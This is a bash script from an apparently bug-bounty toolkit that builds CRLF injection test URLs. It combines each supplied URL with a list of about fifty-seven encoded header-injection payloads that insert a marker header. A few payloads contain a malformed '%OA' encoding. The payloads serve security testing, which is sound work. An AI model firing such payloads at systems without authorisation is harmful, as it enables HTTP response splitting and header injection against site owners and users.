#!/bin/bash

usage="
A part of
      ___           ___           ___     
     /\  \         /\  \         /\__\    
    /::\  \        \:\  \       /::|  |   
   /:/\:\  \        \:\  \     /:|:|  |   
  /::\~\:\  \       /::\  \   /:/|:|__|__ 
 /:/\:\ \:\__\     /:/\:\__\ /:/ |::::\__\\
 \/__\:\/:/  /    /:/  \/__/ \/__/~~/:/  /
      \::/  /    /:/  /            /:/  / 
      /:/  /     \/__/            /:/  /  
     /:/  /                      /:/  /   
     \/__/                       \/__/    

scripts by @9oelm https://github.com/9oelM

atm-generate-crlf-injection-payloads.sh

generates CRLF injection paylods from the list of urls supplied.
injection payload will be either:
- abc.google.com/path/{PAYLOAD}
- abc.google.com/path?{PAYLOAD}={PAYLOAD}
- abc.google.com/{PAYLOAD}
- abc.google.com?anything={PAYLOAD}
because the way the target domain treats querystring and pathname may be different. 

it may be a good idea to include real paths found from tools like 'gau' because the server
may respond differently.

example:
cat urls.txt | atm-generate-crlf-injection-payloads.sh

usage:
-o [optional] path to output file. It will contain the list of valid payloads delimited by newline. 
              by default, the script will stdout payloads, so this option is not necessary.
-h help
"

export CRLF_INJECTION_HEADER="X-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123"
# you SHOULD NOT include \n inside payload
export CRLF_INJECTION_PAYLOADS="%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%0A%20X-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%20%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%23%OAX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%E5%98%8A%E5%98%8DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%E5%98%8A%E5%98%8D%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%3F%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%0A%20X-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%20%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%23%OAX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%E5%98%8A%E5%98%8DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%E5%98%8A%E5%98%8D%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%3F%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%0DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%0D%20X-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%20%0DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%23%0DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%23%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%E5%98%8A%E5%98%8DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%E5%98%8A%E5%98%8D%0DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%3F%0DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%0DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%0D%20X-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%20%0DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%23%0DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%23%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%E5%98%8A%E5%98%8DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%E5%98%8A%E5%98%8D%0DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%3F%0DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%0D%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%0D%0A%20X-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%20%0D%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%23%0D%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%5cr%5cnX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%E5%98%8A%E5%98%8DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%E5%98%8A%E5%98%8D%0D%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%3F%0D%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%0D%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%0D%0A%20X-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%20%0D%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%23%0D%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%5cr%5cnX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%E5%98%8A%E5%98%8DX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%E5%98%8A%E5%98%8D%0D%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%3F%0D%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%0D%0A%09X-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
crlf%0D%0A%09X-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%250AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%25250AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%%0A0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%25%30AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%25%30%61X-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
%u000AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
//www.google.com/%2F%2E%2E%0D%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
/www.google.com/%2E%2E%2F%0D%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123
/google.com/%2F..%0D%0AX-Amz-Id-Custom-Test-Sxa6S1zx3F4wtLyg:123"

declare -a all_commands=("unfurl")
all_commands_length=${#array[@]}

for i in ${!all_commands[@]}; do
    if ! command -v "${all_commands[i]}" >"/dev/null"; then
        echo "[!] Command ${all_commands[i]} does not exist. You need to install it first. View README.md for installation instructions."
        exit
    fi
done

while getopts o:h: flag; do
    case "${flag}" in
    o)
        OUTPUT_FILE_PATH=${OPTARG}
        ;;
    h)
        printf "${usage}"
        exit
        ;;
    *) 
        printf "${usage}" 
        exit 
        ;;
    esac
done

[ -f "${OUTPUT_FILE_PATH}" ] && echo "[!] File ${OUTPUT_FILE_PATH} already exists. Please try again." && exit 

export OUTPUT_FILE_PATH
stdin=""
if [ -p /dev/stdin ]; then
    stdin=$(cat /dev/stdin)
else
    echo "[!] No stdin detected. Pipe input into this script."
    echo "${usage}"
    echo "[!] No stdin detected. Pipe input into this script."
    exit
fi

beginswith() { case $2 in "$1"*) true;; *) false;; esac; }
export -f beginswith

all_url_payloads=""
export all_url_payloads
# may just use curl -X HEAD URL, but HEAD may respond differently, so just use classic GET 

function create_payload() {
    url="$1"
    # line: abc.google.com/path/path2/path3
    url_without_trailing_slash=$(echo "$url" | sed 's:/*$::')
    # if not prefixed with https:// or http://, just prefix https://
    if (! beginswith "https://" "${url_without_trailing_slash}") && (! beginswith "http://" "${url_without_trailing_slash}"); then
        # Your code here
        url_without_trailing_slash="https://${url_without_trailing_slash}"
    fi

    # abc.google.com/
    while IFS= read -r payload
    do
        # abc.google.com/path/path2/path3/payload        
        payload_1="${url_without_trailing_slash}/${payload}"
        # abc.google.com/path/path2/path3/?payload=payload        
        payload_2="${url_without_trailing_slash}/?${payload}=${payload}"
        all_url_payloads="${all_url_payloads}${payload_1}\n${payload_2}\n" 
        # abc.google.com/path/path2/path3 --> gets /path/path2/path3
        url_path_only=$(echo ${url_without_trailing_slash} | unfurl format %p)
        # if url has a path
        if [ ! -z "$url_path_only" ]; then
            # /path/path2
            parent_path=$(dirname "${url_path_only}")
            # abc.google.com:optional_port (colon is also optional only if port exists)
            # @todo support http later
            domain=$(echo "${url_without_trailing_slash}" | unfurl format %s://%d%:%P)
            # abc.google.com/path/path2/payload
            payload_3="${domain}${parent_path}${payload}"
            # abc.google.com/path/path2/?payload=payload
            payload_4="${domain}${parent_path}?${payload}=${payload}"
            all_url_payloads="${all_url_payloads}${payload_3}\n${payload_4}\n"
        fi
    done <<< "$CRLF_INJECTION_PAYLOADS"
    echo -e "${all_url_payloads}" | awk NF | tee -a "${OUTPUT_FILE_PATH}"
}

export -f create_payload
# generate all payloads here
echo "$stdin" | tr '[\n]' '[\0]' | xargs -P1 -r0 -n1 /bin/bash -c 'create_payload "$@";' '' 
